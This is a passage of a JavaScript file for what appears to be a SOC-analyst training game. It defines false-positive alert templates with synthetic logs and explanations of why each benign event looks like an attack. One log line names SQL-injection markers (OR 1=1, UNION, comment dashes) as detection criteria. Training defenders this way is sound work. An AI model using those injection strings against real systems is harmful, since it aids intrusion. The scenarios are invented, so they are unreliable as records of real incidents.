        explanation: 'Keyword rules can\'t tell real security notifications from phishing that imitates them — verification is the analyst\'s job. Here every technical check passes for the genuine domain and the business context explains the mail. Compare with typosquat alerts where the domain is subtly wrong: the domain is exactly where scrutiny belongs. False positive.',
      }
    },
  },
  {
    id: 'fp-replication', tier: 2, verdict: 'fp', category: 'exfil',
    correctAction: 'close', severity: 'medium', source: 'Network / DLP',
    ruleName: 'Sustained High-Volume Transfer',
    build() {
      const gb = randInt(150, 400)
      const times = timeSequence(4, 900, 1800)
      return {
        title: `Sustained ${gb} GB transfer from SRV-DB-01 to 10.90.0.8`,
        entity: 'SRV-DB-01',
        description: `Network monitoring flagged a sustained ${gb} GB transfer from production database server SRV-DB-01 to 10.90.0.8 over the past 2 hours. The destination is DR-DB-01, the disaster-recovery replica in the secondary datacenter (10.90.0.0/24 = DR site VLAN). Change ticket CHG-${randInt(40000, 49999)} covers tonight's re-seeding of the DR replica after last week's storage upgrade.`,
        logs: [
          `${times[0]} NET flow src=SRV-DB-01 dst=10.90.0.8 port=5022 proto=SQL-AlwaysOn bytes=${gb}GB ongoing`,
          `${times[1]} SQL log: availability group re-seed to DR-DB-01 initiated by dba-team`,
          `${times[2]} CHG ticket: "Re-seed DR replica post storage upgrade" window 00:00–06:00 approved`,
          `${times[3]} Destination 10.90.0.8 = DR-DB-01 (CMDB: DR site, company-owned VLAN)`,
        ],
        enrichment: [
          { label: 'Rule trigger', value: `${gb} GB sustained from a production database server — matches the exfiltration volume model`, tone: 'bad' },
          { label: 'Destination', value: 'DR-DB-01 — company DR datacenter over private link; data never leaves org control', tone: 'ok' },
          { label: 'Change ticket', value: 'Approved CHG covering exactly this window and system pair', tone: 'ok' },
          { label: 'Protocol', value: 'SQL AlwaysOn replication on the standard endpoint port', tone: 'ok' },
        ],
        explanation: 'Database replication to a disaster-recovery site is another benign twin of exfiltration: huge volume, off-hours, sustained. The checklist is the same every time — where is it going (company DR VLAN), is it sanctioned (approved change ticket), what protocol (native SQL replication). All three check out; false positive.',
      }
    },
  },
  {
    id: 'fp-vpn-travel', tier: 3, verdict: 'fp', category: 'brute_force',
    correctAction: 'close', severity: 'high', source: 'AD / Identity',
    ruleName: 'Impossible Travel — Logon from New Country',
    build() {
      const { name, user } = randomFullNameAndUser()
      const country = pick(COUNTRIES_TRAVEL)
      const times = timeSequence(4, 600, 1500)
      return {
        title: `Impossible travel: ${user} logon from ${country} 40 min after office logon`,
        entity: user,
        description: `Identity protection flagged "${user}": an office logon in Warsaw at ${times[0]}, then a logon from a ${country} IP 40 minutes later — physically impossible travel. The ${country} address belongs to the corporate VPN provider's egress range: the user connected via the global VPN client, which routes through the provider's nearest healthy node, and tonight's European nodes are in maintenance (IT notice published this afternoon).`,
        logs: [
          `${times[0]} AUTH SUCCESS user=${user} src=office-lan (Warsaw HQ) type=interactive`,
          `${times[1]} VPN connect user=${user} client=GlobalProtect egress=${country}-node-04`,
          `${times[2]} AUTH SUCCESS user=${user} src=vpn-egress-${country.toLowerCase().slice(0, 3)} — triggers impossible-travel model`,
          `${times[3]} IT-OPS notice #4412: "EU VPN nodes in maintenance tonight, traffic rerouting to APAC/AMER nodes"`,
        ],
        enrichment: [
          { label: 'Travel computation', value: `Warsaw → ${country} in 40 minutes — physically impossible for a person`, tone: 'bad' },
          { label: 'Source IP owner', value: `Corporate VPN provider egress range (${country} node) — verified in provider docs`, tone: 'ok' },
          { label: 'Device', value: 'Same enrolled corporate laptop for both logons, device compliance passing', tone: 'ok' },
          { label: 'MFA', value: 'VPN logon completed MFA with the user\'s registered token', tone: 'ok' },
          { label: 'IT notice', value: 'Published maintenance rerouting EU VPN traffic tonight', tone: 'ok' },
        ],
        explanation: 'Impossible-travel detections assume the source IP reflects the user\'s body — VPNs break that assumption. Same enrolled device, passed MFA, egress IP documented as the corporate VPN provider\'s node, and an IT notice explaining tonight\'s rerouting: the "travel" is packet routing, not a person. Worth checking every time (attackers do use foreign IPs), but here every verification passes. False positive.',
      }
    },
  },
  {
    id: 'fp-admin-maint', tier: 3, verdict: 'fp', category: 'lateral',
    correctAction: 'close', severity: 'high', source: 'AD / Identity',
    ruleName: 'Single Account Accessing Multiple Servers',
    build() {
      const admin = `adm-${randomUser()}`
      const times = timeSequence(5, 300, 700)
      const chg = `CHG-${randInt(40000, 49999)}`
      return {
        title: `Account ${admin} logged into 5 servers sequentially at 02:00`,
        entity: admin,
        description: `Admin account "${admin}" performed RDP logons to five production servers between 02:00 and 02:40, executing restarts on each. The pattern (one privileged account, many servers, night hours) matched the lateral-movement rule. Change ticket ${chg} — "Apply critical OS patches to app tier, window 02:00–04:00" — names this admin as the implementer, and the servers match the ticket's scope list exactly.`,
        logs: [
          `${times[0]} AUTH logon type=10 user=${admin} dst=SRV-APP-01; patch install KB5041... ; reboot`,
          `${times[1]} AUTH logon type=10 user=${admin} dst=SRV-APP-02; patch install; reboot`,
          `${times[2]} AUTH logon type=10 user=${admin} dst=SRV-APP-03; patch install; reboot`,
          `${times[3]} AUTH logon type=10 user=${admin} dst=SRV-APP-04, SRV-APP-05 — same sequence`,
          `${times[4]} CHG ${chg}: implementer=${admin}, window 02:00–04:00, scope=SRV-APP-01..05, status=In Progress`,
        ],
        enrichment: [
          { label: 'Observed pattern', value: 'One privileged account, five servers, sequential RDP at 02:00 — the textbook lateral-movement shape', tone: 'bad' },
          { label: 'Change ticket', value: `${chg} approved; implementer, window and server scope all match observed activity`, tone: 'ok' },
          { label: 'Activity on targets', value: 'OS patch installation and reboots — matches ticket work description', tone: 'ok' },
          { label: 'Account', value: `${admin} — designated patching admin, PAM checkout recorded at 01:55`, tone: 'ok' },
          { label: 'Access path', value: 'Via the PAM jump host with session recording, as policy requires', tone: 'ok' },
        ],
        explanation: 'Admins doing night maintenance are the most common lateral-movement false positive. The verification that separates them from an attacker: an approved change ticket matching implementer, window and exact server scope; PAM checkout and jump-host session recording; and on-target activity that matches the ticket. All present. (Attackers don\'t file change requests.) False positive — close with a reference to the ticket.',
      }
    },
  },
  {
    id: 'fp-pentest', tier: 3, verdict: 'fp', category: 'exploit',
    correctAction: 'close', severity: 'critical', source: 'WAF / Web',
    ruleName: 'Active Exploitation — Multiple Attack Vectors',
    build() {
      const ip = randomExternalIP()
      const times = timeSequence(5, 60, 200)
      return {
        title: `Aggressive multi-vector attack from ${ip} — SQLi, XSS, traversal`,
        entity: ip,
        description: `WAF and IDS are firing continuously: ${ip} is running SQL injection, XSS, directory traversal and brute-force attempts against the customer portal. Severity auto-scored CRITICAL. The engagement memo pinned in the SOC wiki states an authorized penetration test of the customer portal runs this week (Tue–Thu nights), and lists this exact IP as the tester's source address with a matching custom User-Agent token "NBF-PENTEST-2026".`,
        logs: [
          `${times[0]} WAF BLOCK src=${ip} uri=/login payload=sqli ua="Mozilla/5.0 NBF-PENTEST-2026"`,
          `${times[1]} WAF BLOCK src=${ip} uri=/search payload=xss ua="Mozilla/5.0 NBF-PENTEST-2026"`,
          `${times[2]} IDS: directory traversal + nikto fingerprint src=${ip}`,
          `${times[3]} SOC wiki: "Authorized pentest — customer portal — source IP ${ip} — UA token NBF-PENTEST-2026 — Tue-Thu 22:00-06:00"`,
          `${times[4]} Scope check: all targeted URIs within the authorized scope list`,
        ],
        enrichment: [
          { label: 'Traffic content', value: 'Live SQLi, XSS and traversal payloads at high rate — genuine attack tooling', tone: 'bad' },
          { label: 'Engagement memo', value: `Authorized pentest active tonight; source IP matches exactly`, tone: 'ok' },
          { label: 'UA token', value: 'Custom identifier "NBF-PENTEST-2026" present on all requests, per the memo', tone: 'ok' },
          { label: 'Scope', value: 'All activity within the documented target scope (customer portal only)', tone: 'ok' },
          { label: 'Caution', value: 'Any activity OUTSIDE the scope list would still be a real alert', tone: 'warn' },
        ],
        explanation: 'Authorized penetration tests generate the scariest-looking telemetry of the month, by design. Verification against the engagement memo is the whole job: source IP matches, the agreed UA token is present, the timing is in the window, and the targets are in scope. Close as an authorized test — but note the discipline: traffic outside the documented scope or window would be treated as real. (Attackers have been known to hide behind pentest windows.)',
      }
    },
  },
  {
    id: 'fp-iam-change', tier: 3, verdict: 'fp', category: 'privesc',
    correctAction: 'close', severity: 'high', source: 'AD / Identity',
    ruleName: 'Sensitive Group Membership Change',
    build() {
      const { user } = randomFullNameAndUser()
      const chg = `CHG-${randInt(40000, 49999)}`
      const times = timeSequence(4, 120, 400)
      return {
        title: `Account ${user} granted "Backup Operators" membership at 01:30`,
        entity: user,
        description: `Account "${user}" was added to the privileged "Backup Operators" group at 01:30 by the IAM automation account (svc-iam-prov). Night-time privileged group changes auto-score HIGH. The grant traces to approved request ${chg}: ${user} joins the infrastructure team Monday and access provisioning was scheduled for tonight's IAM batch window. The grant used the standard role template and carries a 90-day recertification tag.`,
        logs: [
          `${times[0]} AD event 4732: ${user} added to "Backup Operators" performed_by=svc-iam-prov`,
          `${times[1]} IAM workflow: request ${chg} approved by 2 approvers (manager + resource owner)`,
          `${times[2]} IAM batch window: nightly provisioning run 01:00–02:00 (standard schedule)`,
          `${times[3]} Grant metadata: role_template=infra-backup-ops recert_due=90d`,
        ],
        enrichment: [
          { label: 'Rule trigger', value: 'Privileged group modified at 01:30 — outside business hours', tone: 'warn' },
          { label: 'Performed by', value: 'svc-iam-prov — the IAM provisioning automation, via the approved workflow', tone: 'ok' },
          { label: 'Approvals', value: 'Two-step approval recorded (manager + resource owner) on ' + chg, tone: 'ok' },
          { label: 'Context', value: 'Internal transfer to infrastructure team effective Monday', tone: 'ok' },
          { label: 'Contrast', value: 'No self-elevation, no LDAP bypass, no off-workflow modification', tone: 'ok' },
        ],
        explanation: 'The same event type as a critical privilege-escalation alert — what differs is the path. Malicious escalation bypasses process (self-elevation, direct LDAP writes, no ticket); this grant went through the IAM workflow with dual approval, was executed by the provisioning automation in its scheduled window, and matches a role template with recertification. Judge privileged changes by their provenance, not their timestamp. False positive.',
      }
    },
  },
  {
    id: 'fp-loadtest', tier: 3, verdict: 'fp', category: 'brute_force',
    correctAction: 'close', severity: 'medium', source: 'AD / Identity',
    ruleName: 'Authentication Failures Across Multiple Accounts',
    build() {
      const ip = randomInternalIP()
      const times = timeSequence(4, 60, 240)
      return {
        title: `Auth failures across 25 accounts from internal host ${ip}`,
        entity: ip,
        description: `Spraying-pattern rule flagged ${ip} generating authentication failures across 25 accounts against the STAGING identity provider. All 25 accounts follow the pattern svc-loadtest01–25, exist only in the staging directory, and the source resolves to QA-PERF-02, the QA team's performance rig. The QA calendar shows a scheduled overnight load test of the new login flow; the failures stem from a misconfigured credential file in the test harness (JIRA QA-1873, filed this evening by the QA lead).`,
        logs: [
          `${times[0]} AUTH FAIL user=svc-loadtest01 src=${ip} env=STAGING reason=bad_password (x40)`,
          `${times[1]} AUTH FAIL user=svc-loadtest02..25 src=${ip} env=STAGING — uniform failure rate`,
          `${times[2]} CMDB: ${ip} = QA-PERF-02 (JMeter rig, owner: QA team)`,
          `${times[3]} JIRA QA-1873: "load test failing — stale creds in harness config" created 23:40 by QA lead`,
        ],
        enrichment: [
          { label: 'Pattern match', value: 'One source, 25 accounts, uniform failure rate — spraying signature at high confidence', tone: 'bad' },
          { label: 'Environment', value: 'STAGING identity provider only — zero production accounts touched', tone: 'ok' },
          { label: 'Accounts', value: 'svc-loadtest01–25 — synthetic test accounts, exist only in staging', tone: 'ok' },
          { label: 'Source', value: 'QA-PERF-02, the registered performance-testing rig, in its scheduled window', tone: 'ok' },
          { label: 'Root cause', value: 'QA already self-reported the misconfiguration in JIRA before the alert fired', tone: 'ok' },
        ],
        explanation: 'Shape-wise identical to password spraying — many accounts, one source, uniform failures. Substance-wise nothing matches: synthetic test accounts in staging (not production users), a registered QA rig in a scheduled window, and the "attacker" filed a JIRA ticket about their own broken credential file. Environment and account context turn an attack pattern into a test-harness bug. False positive.',
      }
    },
  },
  {
    id: 'fp-helpdesk-rmm', tier: 3, verdict: 'fp', category: 'c2',
    correctAction: 'close', severity: 'medium', source: 'EDR',
    ruleName: 'Remote Access Tool Execution',
    build() {
      const ws = randomWorkstation()
      const { user } = randomFullNameAndUser()
      const inc = `INC-${randInt(80000, 89999)}`
      const times = timeSequence(4, 120, 400)
      return {
        title: `Remote access tool active on ${ws} with outbound control channel`,
        entity: ws,
        description: `EDR flagged ScreenConnect running on ${ws} with a persistent outbound control channel — remote-admin tools are a common attacker C2 disguise. The session traces to helpdesk ticket ${inc}: ${user} reported a broken VPN client at 23:05 (night-shift warehouse staff), and helpdesk technician tk-support3 initiated the session from the IT RMM console two minutes later. The ScreenConnect instance is the company's licensed tenant.`,
        logs: [
          `${times[0]} ${inc} opened by ${user}: "VPN client will not connect, can't reach WMS" priority=P3`,
          `${times[1]} RMM console: tk-support3 started remote session → ${ws} (ticket ref ${inc})`,
          `${times[2]} EDR: ScreenConnect.ClientService.exe signed=valid tenant=northbridge.screenconnect.com`,
          `${times[3]} Session log: VPN client reinstalled, issue resolved, session ended 23:41 (18 min)`,
        ],
        enrichment: [
          { label: 'Capability', value: 'Full remote control with a persistent outbound channel — the same capability class as C2', tone: 'warn' },
          { label: 'Tenant', value: 'northbridge.screenconnect.com — the company\'s own licensed RMM instance', tone: 'ok' },
          { label: 'Ticket correlation', value: `${inc} — user-reported issue 2 minutes before session start`, tone: 'ok' },
          { label: 'Operator', value: 'tk-support3 — on-shift helpdesk tech, session from the IT console', tone: 'ok' },
          { label: 'Caution', value: 'ScreenConnect from an UNKNOWN tenant would be a serious alert — always check the instance', tone: 'warn' },
        ],
        explanation: 'Remote-admin tools are dual-use: attackers deploy the same software as your helpdesk. The deciding factor is the tenant and the paper trail — this session runs from the company\'s own licensed instance, initiated by an on-shift technician, two minutes after the user filed a ticket, with matching session logs. The identical binary from an unknown tenant with no ticket would be C2. False positive.',
      }
    },
  },
  {
    id: 'fp-onedrive', tier: 3, verdict: 'fp', category: 'exfil',
    correctAction: 'close', severity: 'medium', source: 'Web Proxy',
    ruleName: 'Large Upload to Cloud Storage',
    build() {
      const { user } = randomFullNameAndUser()
      const gb = (randInt(180, 350) / 10).toFixed(1)
      const ws = `LT-${pick(['SLS', 'CON'])}-${String(randInt(1, 99)).padStart(3, '0')}`
      const times = timeSequence(4, 600, 1400)
      return {
        title: `${gb} GB upload to cloud storage from ${ws} via VPN`,
        entity: user,
        description: `Proxy flagged ${gb} GB uploaded overnight from laptop ${ws} (user ${user}, consultant, travelling) to OneDrive. The volume rule fired on size + off-hours + VPN source. Inspection shows the destination is the CORPORATE OneDrive tenant (northbridgefinancial-my.sharepoint.com), the process is the signed Microsoft OneDrive sync client, and the content is the user's known-folder backup — triggered because IT migrated their laptop profile today and the sync client re-uploaded the profile.`,
        logs: [
          `${times[0]} PROXY upload session: northbridgefinancial-my.sharepoint.com user=${user} src=vpn-pool`,
          `${times[1]} Process: OneDrive.exe signed=Microsoft path=%LOCALAPPDATA%\\Microsoft\\OneDrive`,
          `${times[2]} IT ticket: laptop profile migration completed today for ${user} (device swap)`,
          `${times[3]} Content: Desktop/Documents known-folder resync — folder set matches profile backup policy`,
        ],
        enrichment: [
          { label: 'Rule trigger', value: `${gb} GB overnight through the VPN — orders of magnitude above this user's baseline`, tone: 'bad' },
          { label: 'Destination tenant', value: 'northbridgefinancial-my.sharepoint.com — corporate tenant, not personal', tone: 'ok' },
          { label: 'Trigger', value: 'Device swap today → OneDrive re-uploading the migrated profile (expected)', tone: 'ok' },
          { label: 'Process', value: 'Genuine signed Microsoft sync client from the standard path', tone: 'ok' },
          { label: 'Contrast', value: 'Personal-account destinations (gmail/consumer Drive) are what exfil looks like', tone: 'warn' },
        ],
        explanation: 'The tenant is everything in cloud-upload alerts: corporate OneDrive sync after a device migration is routine, while the same gigabytes to a personal account is a breach. Here the destination is the company tenant, the client is Microsoft-signed, and an IT ticket explains the trigger. Same rule, same volume, opposite verdict depending on destination — false positive.',
      }
    },
  },
  {
    id: 'fp-legacy-app', tier: 3, verdict: 'fp', category: 'exploit',
    correctAction: 'close', severity: 'medium', source: 'WAF / Web',
    ruleName: 'SQL Keywords in HTTP Requests',
    build() {
      const times = timeSequence(4, 30, 90)
      return {
        title: `SQL keywords in requests to /reports API from internal app`,
        entity: 'APP-REPORTS-01',
        description: `WAF logged requests to the internal /reports API containing raw SQL fragments (SELECT, WHERE, ORDER BY) in a query parameter. The requests originate exclusively from APP-REPORTS-01, the legacy reporting front-end, which — per its (documented) design — passes user-selected report criteria as SQL fragments to the reports API. Engineering's known-issues register lists this as accepted technical debt with a WAF exception pending since Q1. The parameter values match the fixed report-builder templates only.`,
        logs: [
          `${times[0]} WAF ALERT src=APP-REPORTS-01 uri=/api/reports?q=SELECT+region,sum(rev)+WHERE+quarter%3D... rule=sql-keywords`,
          `${times[1]} Pattern check: all requests from 10.20.5.14 (APP-REPORTS-01), none from external sources`,
          `${times[2]} Payload analysis: fragments match the 12 predefined report-builder templates, no tautologies (OR 1=1), no UNION, no comments (--)`,
          `${times[3]} Engineering register: "reports API receives SQL fragments by design — WAF exception request WAF-EX-221 pending"`,
        ],
        enrichment: [
          { label: 'Signature hits', value: 'Raw SQL keywords in HTTP query parameters — the same strings real SQLi uses', tone: 'bad' },
          { label: 'Source', value: 'Only the internal reporting app — zero external or workstation sources', tone: 'ok' },
          { label: 'Payload shape', value: 'Matches fixed report templates; no injection markers (tautology/UNION/comment)', tone: 'ok' },
          { label: 'Documentation', value: 'Known legacy design, registered tech debt, WAF exception in progress', tone: 'ok' },
          { label: 'Caution', value: 'The same rule firing on EXTERNAL traffic to this API must be treated as real SQLi', tone: 'warn' },
        ],
        explanation: 'Signature rules match strings, not intent. This legacy app legitimately ships SQL fragments between its own tiers — ugly architecture, but documented and internal-only. The payloads match fixed templates and lack every actual injection marker (no tautologies, UNION, or comment sequences). False positive against this source — while the identical signature on external traffic would still be a real alert. Precision about source and payload is what stops both over- and under-reacting.',
      }
    },
  },
]

export const TEMPLATES = [...TP, ...FP]

// Composition of one full run: tiers appear in order (shift gets harder).
export const RUN_PLAN = [
  { tier: 1, tp: 5, fp: 3 },
  { tier: 2, tp: 5, fp: 3 },
  { tier: 3, tp: 4, fp: 4 },
]

// SLA (seconds to resolve after opening an alert), by tier.
export const SLA_BY_TIER = { 1: 300, 2: 240, 3: 210 }
